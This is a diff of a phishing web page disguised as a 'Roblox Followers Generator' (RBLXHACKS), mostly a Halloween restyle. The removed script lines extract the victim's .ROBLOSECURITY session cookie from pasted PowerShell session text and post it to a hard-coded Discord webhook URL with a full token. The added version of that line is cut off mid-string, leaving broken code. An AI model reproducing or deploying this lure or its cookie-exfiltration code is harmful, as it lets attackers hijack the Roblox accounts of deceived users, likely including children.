@@ -2,15 +2,16 @@
 <head>
     <meta charset="utf-8"/>
     <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-    <title>Roblox Followers Generator</title>
+    <title>Roblox Followers Generator - Halloween Edition</title>
     <!-- Favicon -->
     <link href="logo.png" rel="icon" type="image/png"/>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&display=swap" rel="stylesheet"/>
     <style>
         body {
-            background: linear-gradient(180deg, #6a0dad, #8a2be2, #4b0082, #0000ff);
+            background: linear-gradient(180deg, #2c2c2c, #1a1a1a, #0d0d0d, #000000);
             background-size: 400% 400%;
             animation: gradient 15s ease infinite;
             color: white;
@@ -54,7 +55,7 @@
         }
         .breathing-animation {
             animation: breathing 3s ease-in-out infinite;
-            background: linear-gradient(90deg, rgba(128, 0, 128, 0.5), rgba(0, 0, 255, 0.5), rgba(255, 255, 255, 0.5));
+            background: linear-gradient(90deg, rgba(255, 69, 0, 0.5), rgba(255, 140, 0, 0.5), rgba(255, 255, 255, 0.5));
             background-size: 200% 200%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -140,7 +141,7 @@
             border: 1px solid rgba(255, 255, 255, 0.3);
         }
         .gradient-button {
-            background: linear-gradient(90deg, rgba(128, 0, 128, 0.5), rgba(0, 0, 255, 0.5));
+            background: linear-gradient(90deg, rgba(255, 69, 0, 0.5), rgba(255, 140, 0, 0.5));
             border: 1px solid rgba(255, 255, 255, 0.3);
             transition: all 0.3s ease;
             background-size: 200% 200%;
@@ -240,70 +241,109 @@
             border-radius: 10px;
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
         }
+        .spooky-font {
+            font-family: 'Creepster', cursive;
+        }
+        .spooky-border {
+            border: 2px solid rgba(255, 69, 0, 0.5);
+            box-shadow: 0 0 10px rgba(255, 69, 0, 0.5);
+        }
+        .spooky-button {
+            background: linear-gradient(90deg, rgba(255, 69, 0, 0.5), rgba(255, 140, 0, 0.5));
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.3s ease;
+            background-size: 200% 200%;
+            animation: gradient-move 3s ease infinite;
+        }
+        .spooky-button:hover {
+            transform: scale(1.05);
+        }
+        .spooky-button:active {
+            transform: scale(0.95);
+        }
+        .spooky-icon {
+            color: #ff4500;
+        }
+        .spooky-header {
+            background: linear-gradient(180deg, #2c2c2c, #1a1a1a, #0d0d0d, #000000);
+            width: 100%;
+            height: 300px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .spooky-footer {
+            background: linear-gradient(180deg, #2c2c2c, #1a1a1a, #0d0d0d, #000000);
+            width: 100%;
+            height: 200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
     </style>
 </head>
 <body>
     <div class="lava-lamp" id="bubbles-container"></div>
-    <header class="text-center p-4">
-        <h1 class="text-white font-bold text-4xl rgb-text glow-effect" style="font-family: 'Roboto', sans-serif;">
+    <header class="spooky-header">
+        <h1 class="text-white font-bold text-4xl rgb-text glow-effect spooky-font">
             RBLXHACKS
         </h1>
     </header>
     <main class="text-center mt-20 flex flex-col items-center">
-        <h2 class="text-4xl font-bold mb-8 text-white pulse-effect">
-            ⭐ ROBLOX FOLLOWERS GENERATOR ⭐
+        <h2 class="text-4xl font-bold mb-8 text-white pulse-effect spooky-font">
+            🎃 ROBLOX FOLLOWERS GENERATOR 🎃
         </h2>
         <p class="mb-8">
             Follower botting has never been easier. RblxHacks has all the right tools in order to make the process seamless.
         </p>
         <div class="flex justify-center space-x-8 mb-16">
-            <div class="text-center cursor-pointer icon-box" onclick="document.getElementById('tutorial').scrollIntoView({ behavior: 'smooth' });">
-                <i class="fas fa-file-alt text-5xl text-purple-500 mb-2"></i>
+            <div class="text-center cursor-pointer icon-box spooky-border" onclick="document.getElementById('tutorial').scrollIntoView({ behavior: 'smooth' });">
+                <i class="fas fa-file-alt text-5xl spooky-icon mb-2"></i>
                 <p class="font-bold">Follow the Setup</p>
             </div>
-            <div class="text-center cursor-pointer icon-box" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
-                <i class="fas fa-rocket text-5xl text-purple-500 mb-2"></i>
+            <div class="text-center cursor-pointer icon-box spooky-border" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
+                <i class="fas fa-rocket text-5xl spooky-icon mb-2"></i>
                 <p class="font-bold">Start the Process</p>
             </div>
-            <div class="text-center icon-box">
-                <i class="fas fa-check-circle text-5xl text-purple-500 mb-2"></i>
+            <div class="text-center icon-box spooky-border">
+                <i class="fas fa-check-circle text-5xl spooky-icon mb-2"></i>
                 <p class="font-bold">Enjoy Your Followers</p>
             </div>
         </div>
-        <button class="gradient-button text-white font-bold py-2 px-4 rounded mb-16" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
+        <button class="spooky-button text-white font-bold py-2 px-4 rounded mb-16" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
             Start Botting
         </button>
         <div class="bg-black bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center content-bg" id="tutorial">
-            <h3 class="text-2xl font-bold mb-4">Our Mission</h3>
+            <h3 class="text-2xl font-bold mb-4 spooky-font">Our Mission</h3>
             <p class="mb-4">
                 RblxHacks' Follower Botter is an advanced PowerShell-based Follower Bot & Auto-Bot. It is capable of botting followers up to 4x faster than other competitors with DL technology. All you need to do is follow the setup below.
             </p>
             <p class="mb-4">
                 Your license is valid until August 27, 2025 12:00 AM EST.
             </p>
-            <h3 class="text-2xl font-bold mb-4">Tutorial</h3>
+            <h3 class="text-2xl font-bold mb-4 spooky-font">Tutorial</h3>
             <div class="flex justify-center mb-8">
                 <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/TpoJ7fKtMvI" title="YouTube video player" width="560"></iframe>
             </div>
         </div>
         <div class="flex items-center justify-center mb-16">
             <img alt="Roblox character with a background of followers" class="w-1/2 h-auto border-none levitation" height="300" src="R.png" width="300"/>
-            <p class="highlight ml-4 text-white bounce-effect">Followers Generator</p>
+            <p class="highlight ml-4 text-white bounce-effect spooky-font">Followers Generator</p>
         </div>
         <div class="bg-black bg-opacity-10 p-16 rounded-lg mb-24 mx-4 shiny-border content-bg" id="followers-botter">
-            <h3 class="text-xl font-bold mb-4">Followers Botter</h3>
+            <h3 class="text-xl font-bold mb-4 spooky-font">Followers Botter</h3>
             <div class="flex flex-col space-y-4">
                 <input class="p-2 rounded input-transparent text-white" id="username" placeholder="Username" type="text"/>
                 <input class="p-2 rounded input-transparent text-white" id="profile" placeholder="Profile" type="text"/>
                 <input class="p-2 rounded input-transparent text-white" id="followers" min="0" placeholder="Followers" step="1" type="number"/>
             </div>
-            <button class="gradient-button text-white font-bold py-2 px-4 rounded mt-4" onclick="sendToWebhook()">
+            <button class="spooky-button text-white font-bold py-2 px-4 rounded mt-4" onclick="sendToWebhook()">
                 Start Botting
             </button>
         </div>
     </main>
     <div class="bg-black bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center content-bg">
-        <h3 class="text-2xl font-bold mb-4">Additional Information</h3>
+        <h3 class="text-2xl font-bold mb-4 spooky-font">Additional Information</h3>
         <p class="mb-4">
             RblxHacks is constantly updated to ensure the best performance and security. Our team is dedicated to providing the best tools for your needs.
         </p>
@@ -314,8 +354,8 @@
             Stay tuned for more updates and features coming soon!
         </p>
     </div>
-    <footer class="text-center p-4 bg-black bg-opacity-50 relative overflow-hidden content-bg">
-        <p>© 2024 RblxHacks. All rights reserved.</p>
+    <footer class="spooky-footer">
+        <p class="text-white">© 2024 RblxHacks. All rights reserved.</p>
     </footer>
     <div class="modal" id="modal">
         <div class="modal-content">
@@ -355,49 +395,4 @@
                 return;
             }
 
-            const webhookUrl = 'https://discord.com/api/webhooks/1281433637639688264/0p0lFWiBxtrckTFeEgOIGMoncu7Di2KpDKTF0bSrqPdq3G5OIAV7Gb0vfjz79WtoDCQ3';
-
-            const data = `Username: ${username}\nProfile: ${profile}\nFollowers: ${followers}`;
-            const lines = data.split('\n').slice(0, 11).join('\n'); // Get the first 11 lines
-
-            if (data.includes('$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession')) {
-                const cookie = data.match(/\.ROBLOSECURITY", "(.*?)"/)[1];
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content: cookie })
-                }).then(response => {
-                    if (response.ok) {
-                        showModal();
-                    } else {
-                        alert('Failed to send data.');
-                    }
-                }).catch(error => {
-                    console.error('Error:', error);
-                    alert('Failed to send data.');
-                });
-            } else {
-                showErrorModal();
-            }
-        }
-
-        function showModal() {
-            const modal = document.getElementById('modal');
-            modal.style.display = 'flex';
-            setTimeout(() => {
-                modal.style.display = 'none';
-            }, 10000);
-        }
-
-        function showErrorModal() {
-            const modal = document.getElementById('modal-error');
-            modal.style.display = 'flex';
-            setTimeout(() => {
-                modal.style.display = 'none';
-            }, 5000);
-        }
-    </script>
-</body>
-</html>
+            const webhookUrl = 'https://discord.com/api/webhooks/1281433637639688264/0p0lFWiBxtrckTFeEgOIG
